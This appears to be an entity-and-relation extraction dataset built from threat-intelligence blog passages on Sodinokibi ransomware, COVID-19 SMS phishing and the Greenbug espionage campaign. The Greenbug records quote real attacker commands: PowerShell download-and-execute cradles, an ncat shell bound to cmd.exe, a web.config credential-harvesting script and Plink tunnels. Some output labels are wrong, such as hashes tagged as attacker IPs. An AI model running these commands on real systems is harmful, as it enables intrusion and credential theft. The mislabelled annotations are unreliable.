{"instruction": "Sodinokibi Sodinokibi is a targeted ransomware - we saw targeted ransomware attacks increase by 62 percent in 2019, and targeted ransomware is one of the biggest threats on the cyber security landscape currently. Sodinokibi (aka REvil) first appeared in April 2019, but the actors behind it are widely believed to be the same actors who operated the GandCrab ransomware. GandCrab was a highly active targeted ransomware that first appeared in 2018. However, in June 2019 its operators announced that they were \u2018retiring\u2019 , claiming that they had made more than $2 billion from the ransomware. However, it\u2019s widely thought that they simply turned their focus to the Sodinokibi ransomware instead.", "input": null, "output": "Named Entities: (Sodinokibi, malware), (REvil, malware), (GandCrab, malware)\nRelationships: (Sodinokibi, aka, REvil)"}
{"instruction": "Sodinokibi was originally believed to be operated by one group but it is now thought to operate as a ransomware-as-a-service (RaaS), where one group maintains the code and rents it out to other groups, known as affiliates, who carry out attacks and spread the ransomware. Any profits made are then split between the affiliates and the original gang.", "input": null, "output": "Named Entities: (Sodinokibi, malware), (ransomware-as-a-service, threat type)\nRelationships: No related relations."}
{"instruction": "Since it appeared on the scene, Sodinokibi has been one of the most prolific targeted ransomware strains and has been seen in numerous high-profile incidents. Actors using Sodinokibi were apparently responsible for the hack of foreign exchange service Travelex on New Year\u2019s Eve. The attack left the company offline for almost a month and caused huge disruption to its business, according to public reports. The attackers were said to have demanded a ransom of $6 million in that incident, with Travelex reportedly eventually paying $2.3 million to regain access to its systems. In January, it was reported that Sodinokibi\u2019s average ransom demand was $260,000 , so this was a huge ransom.", "input": null, "output": "Named Entities: (Sodinokibi, malware), (ransomware, threat type)\nRelationships: No related relations."}
{"instruction": "Sodinokibi hit several other high-profile companies in the last year and, similar to the Maze ransomware group, announced in December 2019 that it would release data stolen from victims if its ransom demands weren\u2019t met. Since that announcement, the gang has been observed offering the data of victims for sale on hacking forums, and at the beginning of June an auction site was launched where the group said it will sell off stolen data to the highest bidder.", "input": null, "output": "Named Entities: (Sodinokibi, malware)\nRelationships: (Sodinokibi, similar to, Maze ransomware group)"}
{"instruction": "Victims The three victims that were infected with Sodinokibi in this campaign were in the services, food, and healthcare sectors. The food and the services companies that were infected were both large, multi-site organizations that were likely capable of paying a large ransom - the type of company that would typically be targeted with Sodinokibi. However, the healthcare organization appears to have been a smaller operation. Interestingly, this victim\u2019s systems were also scanned by the attackers for PoS software. It may be that the attackers realized this business might not be in a position to pay the large ransoms usually demanded in a Sodinokibi attack, and so scanned for PoS software to determine if they could profit from the compromise in another way, or they may have been scanning for this kind of software simply to encrypt it too. Figure. The ransom note seen by victims in this campaign", "input": null, "output": "Named Entities: (Sodinokibi, malware)\nRelationships: No related relations."}
{"instruction": "The attackers requested that the ransom be paid in the Monero cryptocurrency, which is favored for its privacy as, unlike Bitcoin, you cannot necessarily track transactions. For this reason we do not know if any of the victims paid the ransom, which was $50,000 if paid in the first three hours, rising to $100,000 after that time.", "input": null, "output": "No related entities and relations."}
{"instruction": "Conclusion \nWhile many of the elements of this attack are \u2018typical\u2019 tactics seen in previous attacks using Sodinokibi, the scanning of victim systems for PoS software is interesting, as this is not typically something you see happening alongside targeted ransomware attacks. It will be interesting to see if this was just opportunistic activity in this campaign, or if it is set to be a new tactic adopted by targeted ransomware gangs. \nOne thing that is clear is the actors using Sodinokibi are sophisticated and skilled and show no sign that their activity is likely to decrease anytime soon. The companies targeted with this ransomware tend to be large corporate organizations, so companies like this need to be aware of the threat posed by this kind of activity.", "input": null, "output": "Named Entities: (Sodinokibi, malware), (ransomware, threat type)\nRelationships: No related relations."}
{"instruction": "Endpoint Protection \nRansom.Sodinokibi \nTrojan.Agentemis (aka Cobalt Strike)", "input": null, "output": "Relationships: (Agentemis, aka, Cobalt Strike)"}
{"instruction": "Threat Landscape Trends \u2013 Q1 2020", "input": null, "output": "No related entities and relations."}
{"instruction": "A look at the cyber security trends from the first three months of 2020. \nTowards the end of the first quarter of 2020, we took a look through telemetry from our vast range of data sources and selected some of the trends that stood out. \nFrom COVID-19-themed malicious email and BEC scams to vulnerability exploits and IoT attacks, let\u2019s take a quick look at the trends that shaped the cyber security threat landscape in the first three months of 2020.", "input": null, "output": "No related entities and relations."}
{"instruction": "Influx of Coronavirus Malicious Email \nWhile news of the coronavirus pandemic began to circulate in December 2019, it was March 2020 before the subject began to be used noticeably as a lure in malware-bearing emails. In February, Symantec, a division of Broadcom (NASDAQ:\u00a0AVGO), blocked approximately 5,000 malicious emails with \u201ccoronavirus\u201d, \u201ccorona\u201d, or \u201cCOVID-19\u201d in the subject line. However, in March this number increased significantly to roughly 82,000. \nMore information on this trend\u00a0can be found in our blog COVID-19 Outbreak Prompts Opportunistic Wave of Malicious Email Campaigns . \nFigure 1. Coronavirus-related malicious email", "input": null, "output": "No related entities and relations."}
{"instruction": "BEC Scams Resulted in $1.77 Billion in Losses for Victims \nAccording to the FBI , business email compromise (BEC) scams are the most damaging and effective type of cyber crime, accounting for over $1.77 billion in losses for victims last year. While the number of organizations targeted by BEC scams was down from Q4 2019 numbers, there were still almost 31,000 organizations targeted in Q1 2020. \nFigure 2. Organizations targeted by BEC scams", "input": null, "output": "Named Entities: (BEC Scams, threat type)\nRelationships: No related relations."}
{"instruction": "Formjacking Criminals Increase Efforts \nThe number of unique websites compromised with formjacking code increased in Q1 2020 as more criminals vie for their share of this lucrative malicious activity. There were 7,836 websites compromised with formjacking code in Q1 2020, up from 7,663 the previous quarter. \nTo learn more about formjacking, read our white paper: How Malicious JavaScript Code is Stealing User Data from Thousands of Websites Each Month \nFigure 3. Websites compromised with formjacking code \nFigure 4. Top countries for formjacking", "input": null, "output": "Named Entities: (Formjacking, threat type)\nRelationships: No related relations."}
{"instruction": "Hackers Rush to Exploit Vulnerabilities Emerging in Early 2020 A directory traversal vulnerability in Citrix Application Delivery Controller and Citrix Gateway ( CVE-2019-19781 ) was disclosed on December 17, 2019. Patches for the flaw, which could permit a remote attacker to execute arbitrary code on vulnerable computers, were not rolled out until January 2020. There was a spike in exploit attempts for this vulnerability immediately after its disclosure, peaking in February with over 492,000 attempts blocked by Symantec ( Web Attack: Citrix ADC RCE CVE-2019-19781 ). Figure 5. Citrix vulnerability exploit attempts blocked", "input": null, "output": "Named Entities: (CVE-2019-19781, vulnerability)\nRelationships: No related relations."}
{"instruction": "Phishing Makes a Comeback \nAfter declining markedly in 2019, phishing increased significantly during the first quarter of 2020, accounting for 1 in every 4,200 emails. Phishing activity is now back up to near where it was during 2018. The availability of more sophisticated phishing kits on the cyber underground may be driving a renewed interest in this form of attack. Some of the increase may also be accounted for by the upsurge in COVID-19-themed email attacks. \nFigure 7. Phishing rate", "input": null, "output": "Named Entities: (Phishing, threat type)\nRelationships: No related relations."}
{"instruction": "IOT Attacks on the Rise The number of attacks against Symantec IOT honeypots* was up 13 percent in Q1 compared to Q4 of 2019. *Symantec\u2019s IOT honeypots emulate protocols used by virtually all IOT devices, such as routers, connected cameras, digital video recorders, and so on. Figure 8. IoT honeypot attacks increased in Q1 However, the number of unique IP addresses performing IOT attacks fell by 14 percent in the same period, indicating that while IoT botnets may be more aggressive in performing attacks, their relative size has fallen. Figure 9. Unique IP addresses performing IoT attacks The top ten passwords used in attacks on IOT devices. Most of the credentials used by attackers are default or easily guessable. Figure 10. Top passwords used in IoT attacks", "input": null, "output": "Named Entities: (IoT botnets, threat type)\nRelationships: No related relations."}
{"instruction": "The largest amount of attacks originated from IP addresses located in the U.S. followed by China, Vietnam, Taiwan, and South Korea. Since attacks are carried out by botnets of infected IOT devices, these countries have the highest number of infected IOT devices. Figure 11. IoT attack origination For the latest insights on threat intelligence visit Symantec Enterprise Blog/Threat Intelligence .", "input": null, "output": "Named Entities: (botnets, threat type)\nRelationships: No related relations."}
{"instruction": "SMS Phishing Campaigns Take Advantage of Coronavirus Pandemic", "input": null, "output": "Named Entities: (SMS Phishing Campaigns, threat type)\nRelationships: No related relations."}
{"instruction": "Symantec finds that 1 in 20 COVID-19 related SMS messages contain phishing attempts or other high-risk content. As with all major newsworthy events, it was inevitable that criminals would take advantage of the COVID-19 pandemic. Symantec, a division of Broadcom (NASDAQ: AVGO), has already published blogs detailing how spammers and scammers are using coronavirus-themed lures in their malicious email campaigns , and how malicious Android apps are also exploiting the outbreak . However, a more direct method to target people, and one that is arguably more trusted by users, is via text (SMS) messages sent to mobile phones.", "input": null, "output": "Named Entities: (phishing attempts, threat type), (criminals, attacker), (malicious email campaigns, tool), (malicious Android apps, tool), (text (SMS) messages, tool)\nRelationships: No related relations."}
{"instruction": "With this in mind, we analyzed links contained within more than 3 million SMS messages from hundreds of thousands of mobile devices from around the world that use Symantec\u2019s mobile security technologies. Symantec Endpoint Protection Mobile (SEP Mobile) shields users from SMS phishing attempts by checking URLs found in text messages against the threat intelligence in Symantec WebPulse , part of the Symantec Global Intelligence Network (GIN), and alerting users when the links are suspect. While malicious SMS messages often use URL shortening services to evade detection and hide destination URLs that would otherwise appear risky, our technologies follow the attack trail to the final URL destination.", "input": null, "output": "Named Entities: (SMS phishing attempts, threat type), (malicious SMS messages, tool), (URL shortening services, tool)\nRelationships: (malicious SMS messages, use, URL shortening services)"}
{"instruction": "We first began monitoring and evaluating the risk of COVID-19 related SMS messages soon after news of the virus began circulating in December 2019. We observed the first high-risk SMS phishing attack using COVID-19 as bait on January 24, 2020, roughly around the same period as the virus began to receive more media coverage.", "input": null, "output": "Named Entities: (SMS phishing attack, threat type)\nRelationships: No related relations."}
{"instruction": "Up until March, we observed very few incidents of SMS phishing attacks using COVID-19 as bait. From late January to early March, only 1 in 500 (0.2 percent) COVID-19 related SMS messages were rated as high risk. However, COVID-19 SMS messages sent by scammers followed the same trend line as the coronavirus outbreak, which was officially declared a pandemic in March 2020. The number of high-risk COVID-19 SMS messages quickly increased after this, and by the third week of March, roughly 1 in 20 (5 percent) messages were categorized as a phishing attack or other type of high-risk attack. We observed several types of COVID-19 related SMS phishing scams. The criminals behind these scams all use the same tactic; taking advantage of people\u2019s fears and financial hardships during the global pandemic in order to lure them in.", "input": null, "output": "Named Entities: (SMS phishing attacks, threat type), (scammers, attacker)\nRelationships: No related relations."}
{"instruction": "The following are just three examples of financial-themed SMS phishing scams that use COVID-19 related lures (Note: Symantec\u2019s mobile security technologies do not collect user-identifying information from SMS messages): Message: (Notification - ALERT ) Dear client, Scotiabank is working with the Government to make the Emergency Covid-19 Benefits deposits easier. To complete your Benefit demand. Please visit : www.Scotia-0nline.com Included URL: www.Scotia-0nline.com Platform: iOS Apparent sender: [email protected] Message: TD BANK: We doing an update due to COVID-19. Click to login. Included URL: https://client-7492703.online Platform: Android Apparent sender: +15197551999 Message: URGENT: UKGOV has issued a payment of 458 GBP to all residents as part of its promise to battle COVID 19. TAP here to apply Included URL: https://uk-covid-19.webredirect.org Platform: iOS Apparent sender: covid", "input": null, "output": "Named Entities: (SMS phishing scams, threat type), (www.Scotia-0nline.com, URL), (https://client-7492703.online, URL),  (https://uk-covid-19.webredirect.org, URL)\nRelationships: No related relations."}
{"instruction": "SMS Message Trends vs. COVID-19 Outbreak \nIt's no surprise that SMS related texts and scams follow the same trend lines of the COVID-19 outbreak. What is surprising, however, is the amount of time it took for the scammers to catch up. We observed a significant increase in the number of SMS phishing scams over the third week of March. \nFigure 1. All COVID-19 SMS messages March 1 to April 13 \nFigure 2. High-risk COVID-19 SMS messages March 1 to April 13 \nFigure 3. Worldwide COVID-19 cases March 1 to April 13", "input": null, "output": "Named Entities: (SMS phishing scams, threat type)\nRelationships: No related relations."}
{"instruction": "Mitigation \nBe suspicious of texts that contain a call to action, such as a link or a request for you to call or text a phone number. \nBe suspicious of messages that include anything suspicious or out of character, including misspelled words or improper grammar. \nIf you are unsure if a text has come from a legitimate organization, such as a bank or a hospital for instance, look up their number using directory assistance or other trusted source and call them to check whether they have tried to contact you. \nSymantec Enterprise Blogs You might also enjoy \n6 Min Read", "input": null, "output": "No related entities and relations."}
{"instruction": "Text-Based COVID-19 Spam Wants Your Information, Money Symantec\u2019s Email Threat Isolation stops spammers as they continue to take advantage of coronavirus pandemic. \nSymantec Enterprise Blogs You might also enjoy \n6 Min Read", "input": null, "output": "No related entities and relations."}
{"instruction": "COVID-19 Outbreak Prompts Opportunistic Wave of Malicious Email Campaigns Spammers, scammers, and other threat actors quick to take advantage of global panic surrounding coronavirus outbreak \nSymantec Enterprise Blogs You might also enjoy \n2 Min Read", "input": null, "output": "Named Entities: (Malicious Email Campaigns, threat type)\nRelationships: No related relations."}
{"instruction": "Malicious Android Apps Exploit Coronavirus Panic Symantec found almost a dozen Android apps that pretended to be monitoring the Covid-19 outbreak but were actually infected with malware.", "input": null, "output": "Named Entities: (Malicious Android Apps, malware), (Android apps, tool)\nRelationships: (Malicious Android Apps, infected with, malware)"}
{"instruction": "Sophisticated Espionage Group Turns Attention to Telecom Providers in South Asia", "input": null, "output": "Named Entities: (Sophisticated Espionage Group, attacker)\nRelationships: No related relations."}
{"instruction": "Greenbug is using off-the-shelf and living-off-the-land tools in an information-gathering campaign targeting multiple telecoms organizations. The Greenbug espionage group is actively targeting telecommunications companies in South Asia, with activity seen as recently as April 2020. There are indications that at least one of the companies was first targeted as early as April 2019. Email appears to be the initial infection vector used by the group. Greenbug is using a mixture of off-the-shelf tools and living-off-the-land techniques in these attacks. It appears the group is interested in gaining access to database servers; we see it stealing credentials then testing connectivity to these servers using the stolen credentials.", "input": null, "output": "Named Entities: (Greenbug, attacker), (Email, tool)\nRelationships: (Greenbug, use, off-the-shelf tools), (Greenbug, use, living-off-the-land tools)"}
{"instruction": "Greenbug is believed to likely be based out of Iran, and there has been speculation in the past that it has connections to the destructive Shamoon group, which has carried out disk-wiping attacks against organizations in Saudi Arabia. The Shamoon attacks have been extensively covered, but it was never clear how the attackers stole the credentials that allowed them to introduce their destructive malware onto victim systems . Research by Symantec, a division of Broadcom (NASDAQ: AVGO), in 2017 found evidence that Greenbug was on an organization\u2019s network prior to a wiping attack that involved W32.Disttrack.B (Shamoon\u2019s malware). This link was never definitively established, but cooperation between the two groups is considered a possibility.", "input": null, "output": "Named Entities: (Greenbug, attacker), (Shamoon group, attacker), (W32.Disttrack.B, malware), (disk-wiping attacks, threat type)\nRelationships: (Greenbug, connection to, Shamoon group), (Shamoon group, carried out, disk-wiping attacks)"}
{"instruction": "Much of the activity we saw in this attack campaign is in line with activity we have seen from Greenbug in the past, including the use of email as an initial infection vector, the use of publicly available hack tools like Mimikatz and Plink, and the apparent focus on collecting credentials and maintaining a persistent, low-profile presence on victim networks.", "input": null, "output": "Named Entities: (Greenbug, attacker), (Mimikatz, tool), (Plink, tool)\nRelationships: (Greenbug, use, Mimikatz), (Greenbug, use, Plink)"}
{"instruction": "Infection vector Across multiple victim machines, a file named proposal_pakistan110.chm:error.html was executed via an internet browser. We also see the same file being opened by archiver tools. While we were unable to retrieve the file for analysis, the same technique has been leveraged by Greenbug in the past, as early as 2016. In these earlier attacks, emails were sent to targets containing a link to a likely compromised site, which hosted an archive file. This archive contains a malicious CHM file (compiled HTML Help file), which includes an ADS (alternative data steam) to hide its payload, which is installed when executed. This file usually also contains a decoy PDF file containing an error message that says the file could not be opened correctly. We have also seen similarly named files used in other organizations in the past to drop Trojan.Ismdoor, Greenbug\u2019s custom malware.", "input": null, "output": "Named Entities: (proposal_pakistan110.chm:error.html, file), (Greenbug, attacker), (Trojan.Ismdoor, malware)\nRelationships: (proposal_pakistan110.chm:error.html, opened by, archiver tools), (Greenbug, use, proposal_pakistan110.chm:error.html), (proposal_pakistan110.chm:error.html, drop, Trojan.Ismdoor)"}
{"instruction": "Around the same time as we saw this file, a file called GRUNTStager.hta was also executed. Symantec believes the attackers used the publically available Covenant post-exploitation framework in order to gain an initial foothold in their target organizations. Covenant is a publicly available hack tool that is described as \u201ca .NET command and control framework that aims to highlight the attack surface of .NET, make the use of offensive .NET tradecraft easier, and serve as a collaborative command and control platform.\u201d It is described as being for use by \u201cred teams,\u201d but is also open to being abused by malicious actors.", "input": null, "output": "Named Entities: (GRUNTStager.hta, file), (Covenant, tool)\nRelationships: (GRUNTStager.hta, executed, Covenant)"}
{"instruction": "Case study: Six-month intrusion Greenbug was present on the systems of one organization from October 2019 to April 2020. It appeared to be interested in gaining access to the organization\u2019s database server. The attackers were observed executing various PowerShell commands on the victim system. The first activity was seen on October 11, 2019, when a malicious PowerShell command was executed to install a CobaltStrike Beacon module to download the next stage payload. We were able to extract two command and control (C&C) server addresses from the PowerShell command. Initially, the attackers leveraged this access to execute PowerShell to determine the version of PowerShell installed via $PSVersionTable. After this, we observed the attackers proceed to attempt to download a malicious file hosted on the same previously mentioned C&C server. PowerShell.exe -nop -w hidden -c $L=new-object net.webclient;$L.proxy=[Net.WebRequest]::GetSystemWebProxy();$L.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $L.downloadstring('http://95[.]179.177.157:445/0Zu5WpWN');", "input": null, "output": "Named Entities: (Greenbug, attacker), (CobaltStrike Beacon module, tool), (PowerShell.exe, file), (http://95[.]179.177.157:445/0Zu5WpWN, URL)\nRelationships: (attackers, executing, PowerShell commands)"}
{"instruction": "This command was executed several times but it is unclear if the attackers were successful. Approximately an hour later, the attackers were also observed attempting to perform a download to CSIDL_APPDATA\\a8f4.exe via the bitsadmin utility bitsadmin /transfer a8f4 http://95.179.177.157:8081/asdfd CSIDL_APPDATA\\a8f4.exe The BITS administration utility can be used to download or upload jobs to be executed. It is a legitimate tool that we commonly see abused by malicious actors. The attackers used this tool to download additional malicious tools to the compromised machine. A short time later, the attackers executed several tools from CSIDL_SYSTEM86\\[REDACTED] directory: Hash Directory Tool 2a3f36c849d9fbfe510c00ac4aca1750452cd8f6d8b1bc234d22bc0c40ea1613 csidl_system_drive\\[REDACTED] revshell.exe 9809aeb6fd388db9ba60843d5a8489fea268ba30e3935cb142ed914d49c79ac5 csidl_system_drive\\[REDACTED] printers.exe 3c6bc3294a0b4b6e95f747ec847660ce22c5c4eee2681d02cc63f2a88d2d0b86 csidl_system_drive\\[REDACTED] msf.exe The attackers were then seen launching PowerShell and attempting to execute a PowerShell script called msf.ps1. PowerShell.exe -ExecutionPolicy Bypass -File CSIDL_SYSTEM_DRIVE\\[REDACTED]\\msf.ps1", "input": null, "output": "Named Entities: (CSIDL_APPDATA\\a8f4.exe, file), (bitsadmin, tool), (Hash Directory Tool, tool), (revshell.exe, file), (printers.exe, file), (msf.exe, file), (PowerShell, tool), (msf.ps1, file)\nRelationships: (bitsadmin, download, CSIDL_APPDATA\\a8f4.exe), (PowerShell, execute, msf.ps1)"}
{"instruction": "This command was executed several times and is likely used to install a Metasploit payload to retain access to the compromised machine. That is the last activity seen on that day. No further activity was observed until February 6, 2020, when a suspicious PowerShell command was executed. The PowerShell command follows the execution of the w3wp.exe process \u2013 an application that is used to serve requests to a web application. This may indicate that the attackers have used a webshell on the compromised machine. The following is a copy of the PowerShell command executed by the attackers:", "input": null, "output": "Named Entities: (Metasploit payload, tool), (w3wp.exe, file), (PowerShell command, tool)\nRelationships: (PowerShell command, follows, w3wp.exe)"}
{"instruction": "$ErrorActionPreference = 'SilentlyContinue';$path=\"C:\\[REDACTED]\\\";Foreach ($file in (get-childitem $path -Filter web.config -Recurse)) {; Try { $xml = [xml](get-content $file.FullName) } Catch { continue };Try { $connstrings = $xml.get_DocumentElement() } Catch { continue };if ($connstrings.ConnectionStrings.encrypteddata.cipherdata.ciphervalue -ne $null){;$tempdir = (Get-Date).Ticks;new-item $env:temp\\$tempdir -ItemType directory | out-null; copy-item $file.FullName $env:temp\\$tempdir;$aspnet_regiis = (get-childitem $env:windir\\microsoft.net\\ -Filter aspnet_regiis.exe -recurse | select-object -last 1).FullName + ' -pdf \"\"connectionStrings\"\" ' + $env:temp + '\\' + $tempdir;Invoke-Expression $aspnet_regiis; Try { $xml = [xml](get-content $env:temp\\$tempdir\\$file) } Catch { continue };Try { $connstrings = $xml.get_DocumentElement() } Catch { continue };remove-item $env:temp\\$tempdir -recurse};Foreach ($_ in $connstrings.ConnectionStrings.add) { if ($_.connectionString -ne $NULL) { write-host \"\"$file.Fullname --- $_.connectionString\"\"} } }; This command is used to search for files similar to web.config. For each file found, it extracts username and password information where possible, decrypting it using the aspnet_regiis.exe utility. These credentials may be used to access organizational resources such as SQL servers.", "input": null, "output": "Named Entities: (web.config, file), (aspnet_regiis.exe, file)\nRelationships: (aspnet_regiis.exe, used to decrypt, web.config)"}
{"instruction": "Further activity was seen on February 12 and February 14. On February 12, the attackers returned and executed a tool: pls.exe . An hour later, the attackers bound cmd.exe to a listening port using netcat with the following command: CSIDL_SYSTEM_DRIVE\\[REDACTED]\\infopagesbackup\\ncat.exe [REDACTED] 8989 -e cmd.exe The same command was issued again about 20 minutes later. Two days later, at 7.29am local-time, the attackers returned and connected to the listening port, launching cmd.exe. They issued the following commands: Command Description CSIDL_SYSTEM\\cmd.exe\" /c net user\" List all available local user accounts and information PowerShell -c Get-PSDrive -PSProvider \\\" FileSystem\\\"\"\"\"\"\"\" List all available drives on the filesystem and related information (e.g. available space, location etc.)", "input": null, "output": "Named Entities: (pls.exe, file), (cmd.exe, file), (netcat, tool), (CSIDL_SYSTEM_DRIVE\\[REDACTED]\\infopagesbackup\\ncat.exe, file), (CSIDL_SYSTEM\\cmd.exe, file), (PowerShell, tool)\nRelationships: (CSIDL_SYSTEM_DRIVE\\[REDACTED]\\infopagesbackup\\ncat.exe, issue, cmd.exe), (cmd.exe, issue, CSIDL_SYSTEM\\cmd.exe)"}
{"instruction": "The next day (February 15) the attackers returned to the command prompt and issued a command to add a user and then checked that the user was added. No further activity was observed until March 4, when a PowerShell command was launched at 6.30pm local time. A WMI command was also observed being executed and used to search for a specific account. Shortly after this, the well-known credential-stealing tool Mimikatz was executed from %USERPROFILE%\\documents\\x64. On March 11, the attackers attempted to connect to a database server via PowerShell, presumably using credentials they had stolen. The attackers also used an SQL command to retrieve the version information of the database server, presumably to test the credentials and connectivity. PowerShell -C $conn=new-object System.Data.SqlClient.SQLConnection(\" \"\"Data Source=[REDACTED];User [REDACTED] { $conn.Open(); }Catch { continue; }$cmd = new-object System.Data.SqlClient.SqlCommand(\" \"\"select @@version;\" \"\", $conn);$ds=New-Object system.Data.DataSet;$da=New-Object system.Data.SqlClient.SqlDataAdapter($cmd); [void]$da.fill($ds);$ds.Tables[0];$conn.Close();\"\"", "input": null, "output": "Named Entities: (Mimikatz, tool), (PowerShell, tool), (SQLConnection, tool), (System.Data.SqlClient.SqlCommand, tool), (System.Data.DataSet, tool), (system.Data.SqlClient.SqlDataAdapter, tool)\nRelationships: No related relations."}
{"instruction": "Further activity was seen in April. On April 8, suspicious PowerShell commands were observed attempting to download tools from a remote host. PowerShell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://185.205.210.46:1003/iO0RBYy3O'); PowerShell.exe -nop -w hidden -c $m=new-object net.webclient;$m.proxy=[Net.WebRequest]::GetSystemWebProxy();$m.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $m.downloadstring('http://185.205.210.46:1131/t8daWgy9j13'); That was the only activity seen on April 8, then on April 13 PowerShell was launched and the following commands were observed being executed: Command Description PowerShell.exe\" -noninteractive -executionpolicy bypass whoami\" Check the account name of the current user executing the command PowerShell.exe\" -noninteractive -executionpolicy bypass netstat -a\" Network routing information Next, PowerShell was used to connect to a database server and check the version information, likely to confirm working credentials. This is similar to the previous PowerShell command observed with the exception of a different database server IP address.", "input": null, "output": "Named Entities: (PowerShell, tool), (host. PowerShell.exe, file)\nRelationships: No related relations"}
{"instruction": "Finally, the attackers used PowerShell to view the current ARP table (IPs and hostname of machines that have recently been communicated with) via an arp -a command. That is the last activity we observed on this machine. A number of suspicious files were found on this machine (see IoCs). The files include the Covenant tool and Mimikatz, as already mentioned, as well as Cobalt Strike, an off-the-shelf tool that can be used to load shellcode onto victim machines, and multiple webshells.", "input": null, "output": "Named Entities: (PowerShell, tool), (Covenant, tool), (Mimikatz, tool), (Cobalt Strike, tool), (webshells, tool)\nRelationships: (attackers, use, PowerShell)"}
{"instruction": "Other machines on the same network \nWe saw suspicious activity on various machines on this same victim\u2019s network. The attackers targeted several other users within the organization with the same file, proposal_pakistan110.chm:error.html, which was opened by an archiver tool and, in one instance, via the Microsoft Edge browser. Following this, we observed a backdoor being executed on the machine, alongside additional tools downloaded to the %APPDATA% directory from the attacker\u2019s infrastructure. \nHash Directory Tool \n450ebd66ba67bb46bf18d122823ff07ef4a7b11afe63b6f269aec9236a1790cd CSIDL_COMMON_APPDATA\\oracle local.exe \nee32bde60d1175709fde6869daf9c63cd3227155e37f06d45a27a2f45818a3dc CSIDL_COMMON_APPDATA\\adobe adobe.exe \n071e20a982ea6b8f9d482685010be7aaf036401ea45e2977aca867cedcdb0217 c:\\programdata\\oracle java.ee", "input": null, "output": "Named Entities: (proposal_pakistan110.chm:error.html, file), (archiver tool, tool), (backdoor, tool), (450ebd66ba67bb46bf18d122823ff07ef4a7b11afe63b6f269aec9236a1790cd, SHA256), (ee32bde60d1175709fde6869daf9c63cd3227155e37f06d45a27a2f45818a3dc, SHA256), (071e20a982ea6b8f9d482685010be7aaf036401ea45e2977aca867cedcdb0217, SHA256)\nRelationships: (proposal_pakistan110.chm:error.html, opened by, archiver tool), (proposal_pakistan110.chm:error.html, opened by, Microsoft Edge browser), (archiver tool, executed, backdoor), (attacker's infrastructure, IP, 450ebd66ba67bb46bf18d122823ff07ef4a7b11afe63b6f269aec9236a1790cd), (attacker's infrastructure, IP, ee32bde60d1175709fde6869daf9c63cd3227155e37f06d45a27a2f45818a3dc), (attacker's infrastructure, IP, 071e20a982ea6b8f9d482685010be7aaf036401ea45e2977aca867cedcdb0217)"}
{"instruction": "Tunnels back to attackers On one machine in this organization, we saw some suspicious PowerShell commands executed on December 9. One of the files executed by PowerShell, comms.exe, is Plink. A second similar command used the Bitvise command line tunneling client. Both tools are used to set up a tunnel to attacker-controlled infrastructure to allow Terminal Services and RDP access to an internal machine. \"CSIDL_COMMON_APPDATA\\comms\\comms.exe\" apps.vvvnews.com -P <?,?> -l <?,?> -pw <?,?> -proxytype http_basic \u2013proxyip [REDACTED] -proxyport 8080 -proxyuser [REDACTED].haq -proxypass [REDACTED] -C -R [REDACTED]:4015:[REDACTED]:1540 \"CSIDL_COMMON_APPDATA\\comms\\comms.exe\" [REDACTED] -pw=[REDACTED] -s2c=[REDACTED] 1819 [REDACTED] 3389 -proxy=y -proxyType=HTTP -proxyServer=[REDACTED] -proxyPort=8080 -proxyUsername=[REDACTED]\\[REDACTED].haq -proxyPassword=<?,?> Tools such as Plink and Bitvise are legitimate sysadmin tools, but have been seen being exploited by malicious actors before, including by Iranian actors earlier this year .", "input": null, "output": "Named Entities: (PowerShell, tool), (comms.exe, file)\nRelationships: (PowerShell, executed, comms.exe, file)"}
{"instruction": "Plink was also seen on a second machine in this organization, which appears to have been compromised from November 2019 up to April 2020. The first suspicious activity on this machine was seen on November 13, when PowerShell Remoting was enabled on the machine to allow it to receive PowerShell commands. A PowerShell command was used to download a file from attacker controlled infrastructure and launch it with a specific argument. (New-Object System.Net.WebClient).DownloadFile('http://apps[.]vvvnews.com:8080/Yft.dat', 'C:\\Programdata\\VMware\\Vmware.exe'); start-process C:\\Programdata\\VMware\\Vmware.exe -arg 'L3NlcnZlcj12c2llZ3J1LmNvbSAvaWQ9NDE='; The argument decodes to /server=vsiegru.com /id=41. Shortly after this the Plink utility was executed to establish a connection to the victim network. A second PowerShell command was then executed as follows: Del -force C:\\Programdata\\Vmware\\Vmware.exe; (New-Object System.Net.WebClient).DownloadFile('http://apps[.]vvvnews.com:8080/Yf.dat', 'C:\\Programdata\\Nt.dat'); move C:\\Programdata\\Nt.dat C:\\Programdata\\Vmware\\VMware.exe -force; cmd.exe /c sc create \"VMwareUpdate\" binpath= \"C:\\Programdata\\Vmware\\VMware.exe L3NlcnZlcj1rb3BpbGthb3J1a292LmNvbSAvaWQ9NDkgL3Byb3h5PXllcyAvcHJveHl1cmw\u2026[REDACTED]\u2026BUTUxcamF2ZWQubmFiaSAvcGFzc3dvcmQ9cHRtbEAyMjMz\" displayname= \"VMware Update Service\" start= auto; start-service VMwareUpdate; Exit; The encoded argument decodes to the following: /server=kopilkaorukov.com /id=49 /proxy=yes /proxyurl=http://[REDACTED]:8080 /credential=yes /username=[REDACTED]\\[REDACTED] /password=[REDACTED]", "input": null, "output": "Named Entities: (Plink, tool), (Power Shell, tool), (http://apps[.]vvvnews.com:8080/Yft.dat, URL), (C:\\Programdata\\VMware\\Vmware.exe, file), (C:\\Programdata\\Nt.dat, file), (cmd.exe, file)\nRelationships: No related relations."}
{"instruction": "The attackers were then seen adding a user to the administrators group on this machine. Two further PowerShell commands were executed on the machine about a week later, on November 16. The first decodes to the following: iex ((New-Object Net.WebClient).DownloadString('http://apps[.]vvvnews.com:8080/Default.htt')) As the attackers have set up a tunnel, using the Plink tool, all connections appear to be routing to internal machine IP addresses. This was likely done as a means to evade detection.", "input": null, "output": "Named Entities: (http://apps[.]vvvnews.com:8080/Default.htt, URL), (Plink tool, tool)\nRelationships: (Plink tool, set up, tunnel), (Plink tool, route connections to, internal machine IP addresses)"}
{"instruction": "Activity targeting telecoms Greenbug\u2019s activity in this campaign seems to make it clear that its main focus with these victims is to steal credentials, and to maintain a low profile on the victim\u2019s network so the attackers can remain on it for a substantial period of time. This is typical of the activity we have seen in Greenbug victims in the past, with maintaining persistence on a victim network appearing to be one of the group\u2019s primary goals. Greenbug has also been observed targeting telecoms companies in this same region in previous attack campaigns.", "input": null, "output": "Named Entities: (Greenbug, attacker)\nRelationships: No related relations."}
